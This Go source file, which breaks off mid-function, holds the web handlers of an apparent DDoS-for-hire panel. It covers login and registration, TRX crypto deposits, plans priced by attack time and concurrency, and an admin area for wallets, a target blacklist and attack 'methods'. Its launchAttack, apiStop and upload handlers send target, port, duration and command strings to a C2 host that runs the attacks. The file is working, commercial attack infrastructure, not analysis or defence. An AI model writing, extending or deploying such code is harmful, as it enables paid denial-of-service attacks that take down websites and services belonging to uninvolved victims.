package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"mime/multipart"
	"net/http"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/dchest/captcha"
)

type SessionInfo struct {
	Token     string `json:"token"`
	CreatedAt int64  `json:"created_at"`
	LastSeen  int64  `json:"last_seen"`
	UserAgent string `json:"user_agent"`
	IP        string `json:"ip"`
	Expires   int64  `json:"expires"`
}

// --- HANDLERS ---

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if isRateLimited(getIP(r)) {
		http.Error(w, "Rate Limit", 429)
		return
	}

	if r.Method == "POST" {
		if !validateCSRF(r) {
			http.Error(w, "CSRF Validation Failed", 403)
			return
		}

		u := Sanitize(r.FormValue("username"))
		p := r.FormValue("password")
		var dbHash string
		err := db.QueryRow("SELECT password FROM users WHERE username=?", u).Scan(&dbHash)
		match, _ := comparePasswordAndHash(p, dbHash)
		if err == nil && match {
			db.Exec("DELETE FROM sessions WHERE username=?", u)
			token := createSession(u)
			if token == "" {
				http.Redirect(w, r, "/login?err=session", 302)
				return
			}
			setSessionCookie(w, r, token, 86400)
			if u == "admin" {
				http.Redirect(w, r, "/admin?view=overview", 302)
			} else {
				http.Redirect(w, r, "/dashboard?welcome=true", 302)
			}
		} else {
			http.Redirect(w, r, "/login?err=1", 302)
		}
		return
	}

	setSecurityHeaders(w)
	token := ensureCSRFCookie(w, r)
	renderTemplate(w, "login.html", PageData{CsrfToken: token})
}

func handleUserInfo(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	// Prefer Authorization: Bearer <token> (keeps tokens out of URLs/logs/history).
	// Backward compatible with ?token=... for now.
	tok := ""
	if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
		tok = strings.TrimSpace(strings.TrimPrefix(ah, "Bearer "))
	}
	if tok == "" {
		tok = r.URL.Query().Get("token")
	}

	usr, ok := getUserByToken(tok)
	if !ok {
		http.Error(w, "Bad Token", http.StatusForbidden)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"username": usr.Username,
		"plan":     usr.Plan,
		"balance":  usr.Balance,
		"status":   usr.Status,
	})
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	if isRateLimited(getIP(r)) {
		http.Error(w, "Rate Limit", 429)
		return
	}

	if r.Method == "POST" {
		if !validateCSRF(r) {
			http.Error(w, "CSRF Validation Failed", 403)
			return
		}

		u := Sanitize(r.FormValue("username"))
		p := r.FormValue("password")
		captchaId := r.FormValue("captchaId")
		captchaSolution := r.FormValue("captcha")

		if !captcha.VerifyString(captchaId, captchaSolution) {
			http.Redirect(w, r, "/register?err=captcha_wrong", 302)
			return
		}

		refCode := Sanitize(r.FormValue("ref"))
		var count int
		db.QueryRow("SELECT count(*) FROM users WHERE username = ?", u).Scan(&count)
		if count == 0 {
			hashedPass, _ := generatePasswordHash(p)
			myRefCode := generateToken()[:8]
			var validRef string
			if refCode != "" {
				db.QueryRow("SELECT username FROM users WHERE ref_code=?", refCode).Scan(&validRef)
			}
			db.Exec("INSERT INTO users (username, password, plan, status, api_token, user_id, balance, ref_code, referred_by, ref_earnings) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", u, hashedPass, "Free", "Active", generateToken(), "u#"+generateID(), 0.0, myRefCode, validRef, 0.0)
			token := createSession(u)
			if token == "" {
				http.Redirect(w, r, "/register?err=session", 302)
				return
			}
			setSessionCookie(w, r, token, 86400)
			http.Redirect(w, r, "/dashboard", 302)
		} else {
			http.Redirect(w, r, "/register?err=taken", 302)
		}
		return
	}

	setSecurityHeaders(w)
	token := ensureCSRFCookie(w, r)
	captchaId := captcha.New()
	renderTemplate(w, "register.html", PageData{CaptchaId: captchaId, CsrfToken: token})
}

func handleCreateDeposit(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}

	rawAmt := r.FormValue("amount")
	usdAmt, err := strconv.ParseFloat(rawAmt, 64)
	if err != nil || usdAmt < 1 {
		http.Redirect(w, r, "/deposit?err=min", 302)
		return
	}

	trxPrice := getTrxPrice()
	if trxPrice <= 0 {
		trxPrice = 0.15
	}
	trxAmount := roundFloat(usdAmt/trxPrice, 2)

	walletMu.Lock()
	defer walletMu.Unlock()

	tx, err := db.Begin()
	if err != nil {
		http.Redirect(w, r, "/deposit?err=db", 302)
		return
	}

	var walletAddr string
	err = tx.QueryRow("SELECT address FROM wallets WHERE status='Free' LIMIT 1").Scan(&walletAddr)

	if err != nil {
		b := make([]byte, 16)
		rand.Read(b)
		walletAddr = "T" + fmt.Sprintf("%x", b)
		if _, err := tx.Exec("INSERT OR IGNORE INTO wallets(address, private_key, status, assigned_to) VALUES (?, 'EMERGENCY', 'Free', '')", walletAddr); err != nil {
			tx.Rollback()
			http.Redirect(w, r, "/deposit?err=db", 302)
			return
		}
	}

	depID := generateID()
	expires := time.Now().Add(15 * time.Minute)

	_, err = tx.Exec("INSERT INTO deposits (id, user_id, amount, usd_amount, address, status, date, expires) VALUES (?, ?, ?, ?, ?, 'Pending', ?, ?)",
		depID, username, trxAmount, usdAmt, walletAddr, time.Now().Format("2006-01-02 15:04"), expires)

	if err != nil {
		tx.Rollback()
		http.Redirect(w, r, "/deposit?err=db", 302)
		return
	}

	if _, err := tx.Exec("UPDATE wallets SET status='Busy', assigned_to=? WHERE address=?", depID, walletAddr); err != nil {
		tx.Rollback()
		http.Redirect(w, r, "/deposit?err=db", 302)
		return
	}

	if err := tx.Commit(); err != nil {
		tx.Rollback()
		http.Redirect(w, r, "/deposit?err=db", 302)
		return
	}

	http.Redirect(w, r, "/invoice?id="+depID, 302)
}

func handleInvoicePage(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	id := Sanitize(r.URL.Query().Get("id"))
	var d Deposit
	err := db.QueryRow("SELECT id, amount, usd_amount, address, status, expires FROM deposits WHERE id=?", id).Scan(&d.ID, &d.Amount, &d.UsdAmount, &d.Address, &d.Status, &d.Expires)
	if err != nil {
		http.Redirect(w, r, "/deposit", 302)
		return
	}
	remaining := int(time.Until(d.Expires).Seconds())
	if remaining < 0 {
		remaining = 0
	}
	d.Amount = roundFloat(d.Amount, 2)
	data := InvoiceData{ID: d.ID, Address: d.Address, Amount: d.Amount, UsdAmount: d.UsdAmount, ExpiresInSeconds: remaining, Status: d.Status}
	renderTemplate(w, "invoice.html", data)
}

func handleCheckDeposit(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Header().Set("Content-Type", "application/json")
	id := Sanitize(r.URL.Query().Get("id"))
	var status string
	err := db.QueryRow("SELECT status FROM deposits WHERE id = ?", id).Scan(&status)
	if err != nil {
		w.Write([]byte(`{"status":"Error"}`))
		return
	}
	w.Write([]byte(`{"status":"` + status + `"}`))
}

func handlePurchase(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	id, _ := strconv.Atoi(r.URL.Query().Get("id"))
	tx, err := db.Begin()
	if err != nil {
		http.Redirect(w, r, "/market?err=db", 302)
		return
	}
	defer tx.Rollback()

	var p Product
	err = tx.QueryRow("SELECT name, price, time, concurrents, vip, api_access FROM products WHERE id=?", id).Scan(&p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
	if err != nil {
		http.Redirect(w, r, "/market?err=prod", 302)
		return
	}
	var balance float64
	var referrer string
	err = tx.QueryRow("SELECT balance, referred_by FROM users WHERE username=?", username).Scan(&balance, &referrer)
	if err != nil {
		http.Redirect(w, r, "/market?err=user", 302)
		return
	}
	if roundFloat(balance, 2) < roundFloat(p.Price, 2) {
		http.Redirect(w, r, "/deposit?err=balance", 302)
		return
	}

	newBalance := roundFloat(balance-p.Price, 2)
	if _, err := tx.Exec("UPDATE users SET balance=?, plan=? WHERE username=?", newBalance, p.Name, username); err != nil {
		http.Redirect(w, r, "/market?err=db", 302)
		return
	}

	if referrer != "" {
		kickback := roundFloat(p.Price*cfg.ReferralPercent, 2)
		if _, err := tx.Exec("UPDATE users SET balance=balance+?, ref_earnings=ref_earnings+? WHERE username=?", kickback, kickback, referrer); err != nil {
			http.Redirect(w, r, "/market?err=db", 302)
			return
		}
	}

	var count int
	if err := tx.QueryRow("SELECT count(*) FROM plans WHERE name = ?", p.Name).Scan(&count); err != nil {
		http.Redirect(w, r, "/market?err=db", 302)
		return
	}
	if count == 0 {
		if _, err := tx.Exec("INSERT INTO plans (name, concurrents, max_time, vip, api) VALUES (?, ?, ?, ?, ?)", p.Name, p.Concurrents, p.Time, p.VIP, p.APIAccess); err != nil {
			http.Redirect(w, r, "/market?err=db", 302)
			return
		}
	}

	if err := tx.Commit(); err != nil {
		http.Redirect(w, r, "/market?err=db", 302)
		return
	}
	http.Redirect(w, r, "/dashboard?msg=success", 302)
}

func handleAdminPage(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		http.Redirect(w, r, "/dashboard", 302)
		return
	}
	csrfToken := ensureCSRFCookie(w, r)

	view := r.URL.Query().Get("view")
	if view == "" {
		view = "overview"
	}

	ad := AdminData{Username: "Admin", Uptime: getUptime(), CurrentView: view, RPS: int(atomic.LoadUint64(&currentRPS)), CsrfToken: csrfToken}
	db.QueryRow("SELECT count(*) FROM users").Scan(&ad.TotalUsers)
	ad.RunningAttacks = len(activeAttacks)

	switch view {
	case "overview":
		rows, _ := db.Query("SELECT id, user_id, amount, usd_amount, status, date FROM deposits WHERE status='Pending' ORDER BY date DESC LIMIT 5")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var d Deposit
				rows.Scan(&d.ID, &d.UserID, &d.Amount, &d.UsdAmount, &d.Status, &d.Date)
				ad.Deposits = append(ad.Deposits, d)
			}
		}
		rows, _ = db.Query("SELECT id, name, price, time, concurrents, vip, api_access FROM products")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var p Product
				rows.Scan(&p.ID, &p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
				ad.Products = append(ad.Products, p)
			}
		}
		ad.PlanConfigs = make(map[string]PlanConfig)
		pRows, _ := db.Query("SELECT name FROM plans")
		if pRows != nil {
			defer pRows.Close()
			for pRows.Next() {
				var n string
				pRows.Scan(&n)
				ad.PlanConfigs[n] = PlanConfig{}
			}
		}

	case "users":
		rows, _ := db.Query("SELECT username, plan, status, balance, api_token FROM users ORDER BY balance DESC LIMIT 100")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var u User
				rows.Scan(&u.Username, &u.Plan, &u.Status, &u.Balance, &u.ApiToken)
				ad.Users = append(ad.Users, u)
			}
		}

	case "finance":
		rows, _ := db.Query("SELECT id, user_id, amount, usd_amount, status, date, address FROM deposits ORDER BY date DESC LIMIT 50")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var d Deposit
				rows.Scan(&d.ID, &d.UserID, &d.Amount, &d.UsdAmount, &d.Status, &d.Date, &d.Address)
				ad.Deposits = append(ad.Deposits, d)
			}
		}
		rows, _ = db.Query("SELECT address, status, assigned_to FROM wallets")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var w Wallet
				rows.Scan(&w.Address, &w.Status, &w.AssignedTo)
				ad.Wallets = append(ad.Wallets, w)
			}
		}

	case "attacks":
		mu.Lock()
		for _, v := range activeAttacks {
			ad.ActiveAttacksList = append(ad.ActiveAttacksList, v)
		}
		mu.Unlock()

	case "market":
		rows, _ := db.Query("SELECT id, name, price, time, concurrents, vip, api_access FROM products")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var p Product
				rows.Scan(&p.ID, &p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
				ad.Products = append(ad.Products, p)
			}
		}

	case "tickets":
		rows, _ := db.Query("SELECT id, user_id, category, subject, status, last_update FROM tickets ORDER BY last_update DESC")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var t Ticket
				rows.Scan(&t.ID, &t.UserID, &t.Category, &t.Subject, &t.Status, &t.LastUpdate)
				ad.Tickets = append(ad.Tickets, t)
			}
		}
		if tid := r.URL.Query().Get("ticket"); tid != "" {
			var msgJSON string
			db.QueryRow("SELECT messages, user_id, category, subject, status FROM tickets WHERE id=?", tid).Scan(&msgJSON, &ad.CurrentTicket.UserID, &ad.CurrentTicket.Category, &ad.CurrentTicket.Subject, &ad.CurrentTicket.Status)
			ad.CurrentTicket.ID = tid
			json.Unmarshal([]byte(msgJSON), &ad.CurrentTicket.Messages)
		}

	case "settings":
		ad.PlanConfigs = make(map[string]PlanConfig)
		rows, _ := db.Query("SELECT name, concurrents, max_time, vip, api FROM plans")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var name string
				var p PlanConfig
				rows.Scan(&name, &p.Concurrents, &p.MaxTime, &p.VIP, &p.API)
				ad.PlanConfigs[name] = p
			}
		}

	case "blacklist":
		rows, _ := db.Query("SELECT target, reason, date FROM blacklist")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var b BlacklistEntry
				rows.Scan(&b.Target, &b.Reason, &b.Date)
				ad.Blacklist = append(ad.Blacklist, b)
			}
		}
	}

	renderTemplate(w, "admin.html", ad)
}

func handlePanelAttack(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	if isRateLimited(getIP(r)) {
		http.Error(w, "Rate Limit", http.StatusTooManyRequests)
		return
	}
	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	var d ApiReq
	if err := json.NewDecoder(r.Body).Decode(&d); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	d.Target = strings.TrimSpace(Sanitize(d.Target))
	d.Method = strings.TrimSpace(d.Method)
	d.Port = strings.TrimSpace(d.Port)
	d.Time = strings.TrimSpace(d.Time)
	d.Concurrency = strings.TrimSpace(d.Concurrency)

	var u User
	_ = db.QueryRow("SELECT plan FROM users WHERE username=?", username).Scan(&u.Plan)
	limits := getPlanConfig(u.Plan)
	reqTime, err := strconv.Atoi(d.Time)
	if err != nil || reqTime <= 0 {
		http.Error(w, "Invalid Time", http.StatusBadRequest)
		return
	}
	reqConc, err := strconv.Atoi(d.Concurrency)
	if err != nil || reqConc <= 0 {
		http.Error(w, "Invalid Concurrency", http.StatusBadRequest)
		return
	}
	if reqTime > limits.MaxTime {
		http.Error(w, "Time Limit", http.StatusForbidden)
		return
	}
	if reqConc > limits.Concurrents {
		http.Error(w, "Concurrency Limit", http.StatusForbidden)
		return
	}
	if d.Target == "" {
		http.Error(w, "Target Required", http.StatusBadRequest)
		return
	}
	if isBlacklisted(d.Target) {
		http.Error(w, "Target Blacklisted", http.StatusForbidden)
		return
	}

	// Validate method against admin-managed methods.
	var cmd string
	if err := db.QueryRow("SELECT command FROM methods WHERE name=? AND enabled=1", d.Method).Scan(&cmd); err != nil {
		http.Error(w, "Invalid Method", http.StatusBadRequest)
		return
	}

	id := launchAttack(username, d.Target, d.Port, d.Time, cmd, d.Concurrency)
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "id": id})
}

func launchAttack(user, target, port, duration, method, concurrency string) string {
	id := generateID()
	go func() {
		client := &http.Client{Timeout: 10 * time.Second}
		client.Get(fmt.Sprintf("%s/c2/admin/issue_command?token=%s&command_str=%s&concurrency=%s", cfg.C2Host, cfg.C2Key, method+" "+target+" "+port+" "+duration, concurrency))
	}()
	dur, _ := strconv.Atoi(duration)
	mu.Lock()
	activeAttacks[id] = AttackData{ID: id, UserID: user, Target: target, Method: method, Port: port, Duration: dur, StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(dur) * time.Second)}
	mu.Unlock()
	return id
}

func handlePage(pName string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		setSecurityHeaders(w)
		username, ok := validateSession(r)
		if !ok {
			http.Redirect(w, r, "/login", 302)
			return
		}
		csrfToken := ensureCSRFCookie(w, r)
		var u User
		err := db.QueryRow("SELECT username, plan, status, api_token, user_id, balance, ref_code, ref_earnings FROM users WHERE username=?", username).Scan(&u.Username, &u.Plan, &u.Status, &u.ApiToken, &u.UserID, &u.Balance, &u.RefCode, &u.RefEarnings)
		if err != nil {
			http.Redirect(w, r, "/logout", 302)
			return
		}

		var refCount int
		db.QueryRow("SELECT count(*) FROM users WHERE referred_by=?", u.Username).Scan(&refCount)
		var products []Product
		rows, _ := db.Query("SELECT id, name, price, time, concurrents, vip, api_access FROM products")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var p Product
				rows.Scan(&p.ID, &p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
				products = append(products, p)
			}
		}
		var deposits []Deposit
		rows, _ = db.Query("SELECT id, amount, usd_amount, status, date, address FROM deposits WHERE user_id=? ORDER BY date DESC", u.Username)
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var d Deposit
				rows.Scan(&d.ID, &d.Amount, &d.UsdAmount, &d.Status, &d.Date, &d.Address)
				deposits = append(deposits, d)
			}
		}
		var myTickets []Ticket
		activeTicket := Ticket{}
		viewID := r.URL.Query().Get("ticket")
		rows, _ = db.Query("SELECT id, user_id, category, subject, status, last_update, messages FROM tickets WHERE user_id = ? ORDER BY last_update DESC", u.Username)
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var t Ticket
				var msgJSON string
				rows.Scan(&t.ID, &t.UserID, &t.Category, &t.Subject, &t.Status, &t.LastUpdate, &msgJSON)
				json.Unmarshal([]byte(msgJSON), &t.Messages)
				myTickets = append(myTickets, t)
				if t.ID == viewID {
					activeTicket = t
				}
			}
		}
		// Load methods from DB so panel matches admin configuration
		methods = map[string][]string{"layer4": {}, "layer7": {}}
		mRows, _ := db.Query("SELECT name, layer FROM methods WHERE enabled=1 ORDER BY layer, name")
		if mRows != nil {
			defer mRows.Close()
			for mRows.Next() {
				var name, layer string
				_ = mRows.Scan(&name, &layer)
				layer = strings.ToLower(strings.TrimSpace(layer))
				switch layer {
				case "layer4", "layer7":
					methods[layer] = append(methods[layer], name)
				}
			}
		}
		mBytes, _ := json.Marshal(methods)
		limits := getPlanConfig(u.Plan)
		initials := "?"
		if len(u.Username) > 0 {
			initials = string(u.Username[0:1])
		}
		if len(u.Username) > 1 {
			initials = string(u.Username[0:2])
		}
		pd := PageData{Username: u.Username, UserPlan: u.Plan, UserBalance: u.Balance, CurrentPage: strings.TrimSuffix(pName, ".html"), Products: products, Deposits: deposits, Tickets: myTickets, CurrentTicket: activeTicket, MethodsJSON: string(mBytes), Methods: methods, RefCode: u.RefCode, RefEarnings: u.RefEarnings, UsernameInitials: strings.ToUpper(initials), ApiToken: u.ApiToken, RefCount: refCount, MaxTime: limits.MaxTime, IsAdmin: (u.Username == "admin"), CsrfToken: csrfToken}
		renderTemplate(w, pName, pd)
	}
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	c, err := r.Cookie(sessionCookieName)
	if err == nil {
		db.Exec("DELETE FROM sessions WHERE token=?", c.Value)
	}
	setSessionCookie(w, r, "", -1)
	http.Redirect(w, r, "/", 302)
}

func apiList(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	mu.Lock()
	defer mu.Unlock()
	var list []AttackData
	for _, v := range activeAttacks {
		if v.UserID == username {
			list = append(list, v)
		}
	}
	json.NewEncoder(w).Encode(list)
}

func apiStop(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	id := r.FormValue("id")
	if id == "" {
		http.Error(w, "Missing id", http.StatusBadRequest)
		return
	}
	stopped := false
	mu.Lock()
	atk, exists := activeAttacks[id]
	if exists && atk.UserID == username {
		delete(activeAttacks, id)
		stopped = true
		go func() {
			client := &http.Client{Timeout: 10 * time.Second}
			_, _ = client.Get(fmt.Sprintf("%s/c2/admin/stop?token=%s&id=%s", cfg.C2Host, cfg.C2Key, id))
		}()
	}
	mu.Unlock()
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "stopped": stopped})
}

func apiStopAll(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	stopped := 0
	mu.Lock()
	for id, atk := range activeAttacks {
		if atk.UserID == username {
			delete(activeAttacks, id)
			stopped++
		}
	}
	mu.Unlock()
	go func() {
		client := &http.Client{Timeout: 10 * time.Second}
		_, _ = client.Get(fmt.Sprintf("%s/c2/admin/stop_all?token=%s", cfg.C2Host, cfg.C2Key))
	}()
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "stopped": stopped})
}

func handleGenCode(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	code := generateToken()[:12]
	plan := r.FormValue("plan")
	db.Exec("INSERT INTO redeem_codes VALUES (?, ?, 0)", code, plan)
	w.Write([]byte(code))
}

func handleConfigPlans(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	_ = r.ParseForm()
	name := r.FormValue("name")
	if name != "" {
		conc, _ := strconv.Atoi(r.FormValue("concurrents"))
		time, _ := strconv.Atoi(r.FormValue("time"))
		vip := r.FormValue("vip") == "true"
		api := r.FormValue("api") == "true"
		db.Exec("INSERT OR REPLACE INTO plans (name, concurrents, max_time, vip, api) VALUES (?, ?, ?, ?, ?)", name, conc, time, vip, api)
	} else {
		rows, err := db.Query("SELECT name, api FROM plans")
		if err == nil {
			defer rows.Close()
			for rows.Next() {
				var planName string
				var api bool
				if err := rows.Scan(&planName, &api); err != nil {
					continue
				}
				conc, err := strconv.Atoi(r.FormValue(planName + "_conc"))
				if err != nil {
					continue
				}
				maxTime, err := strconv.Atoi(r.FormValue(planName + "_time"))
				if err != nil {
					continue
				}
				vip := r.FormValue(planName+"_vip") == "on" || r.FormValue(planName+"_vip") == "true"
				db.Exec("UPDATE plans SET concurrents=?, max_time=?, vip=?, api=? WHERE name=?", conc, maxTime, vip, api, planName)
			}
		}
	}
	http.Redirect(w, r, "/admin?view=settings", 302)
}

func handleAddProduct(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	name := r.FormValue("name")
	price, _ := strconv.ParseFloat(r.FormValue("price"), 64)
	dur, _ := strconv.Atoi(r.FormValue("time"))
	conc, _ := strconv.Atoi(r.FormValue("concurrents"))
	vip := r.FormValue("vip") == "on"
	api := r.FormValue("api") == "on"
	db.Exec("INSERT INTO products (name, price, time, concurrents, vip, api_access) VALUES (?, ?, ?, ?, ?, ?)", name, price, dur, conc, vip, api)
	http.Redirect(w, r, "/admin?view=market", 302)
}

func handleDelProduct(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	db.Exec("DELETE FROM products WHERE id = ?", r.FormValue("id"))
	http.Redirect(w, r, "/admin?view=market", 302)
}

func handleAddWallet(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	db.Exec("INSERT INTO wallets(address, private_key, status, assigned_to) VALUES (?, ?, 'Free', '')", Sanitize(r.FormValue("address")), r.FormValue("private_key"))
	http.Redirect(w, r, "/admin?view=finance", 302)
}

func handleDelWallet(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	db.Exec("DELETE FROM wallets WHERE address=?", Sanitize(r.FormValue("address")))
	http.Redirect(w, r, "/admin?view=finance", 302)
}

func handleBlacklistOp(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	action := r.FormValue("action")
	target := Sanitize(r.FormValue("target"))
	if action == "add" {
		db.Exec("INSERT INTO blacklist VALUES (?, ?, ?)", target, Sanitize(r.FormValue("reason")), time.Now().Format("2006-01-02"))
	} else {
		db.Exec("DELETE FROM blacklist WHERE target = ?", target)
	}
	http.Redirect(w, r, "/admin?view=blacklist", 302)
}

func handleUploadMethod(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}

	name := Sanitize(r.FormValue("name"))
	layer := strings.ToLower(strings.TrimSpace(r.FormValue("type")))
	command := strings.TrimSpace(r.FormValue("command"))
	if name == "" || (layer != "layer4" && layer != "layer7") || command == "" {
		http.Redirect(w, r, "/admin?view=methods&err=invalid", 302)
		return
	}

	// Save locally so user panel can always reflect admin-configured methods.
	_, _ = db.Exec("INSERT OR REPLACE INTO methods(name, layer, command, enabled) VALUES (?, ?, ?, 1)", name, layer, command)

	// Forward to C2 as before (best effort).
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	writer.WriteField("name", name)
	writer.WriteField("type", layer)
	writer.WriteField("command", command)
	writer.Close()

	req, _ := http.NewRequest("POST", cfg.C2Host+"/admin/upload_method", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("X-API-Key", cfg.C2Key)
	client := &http.Client{Timeout: 10 * time.Second}
	_, _ = client.Do(req)

	http.Redirect(w, r, "/admin?view=methods", 302)
}

func handleDepositAction(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	id := r.FormValue("id")
	action := r.FormValue("action")
	if action == "confirm" {
		var user string
		var usd float64
		db.QueryRow("SELECT user_id, usd_amount FROM deposits WHERE id=?", id).Scan(&user, &usd)
		db.Exec("UPDATE deposits SET status='Confirmed' WHERE id=?", id)
		db.Exec("UPDATE users SET balance=balance+? WHERE username=?", usd, user)
		db.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to=?", id)
	} else {
		db.Exec("UPDATE deposits SET status='Cancelled' WHERE id=?", id)
		db.Exec("UPDATE wallets SET status='Free', assigned_to='' WHERE assigned_to=?", id)
	}
	http.Redirect(w, r, "/admin?view=finance", 302)
}

func handleCreateTicket(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok {
		return
	}
	if r.Method != http.MethodPost {
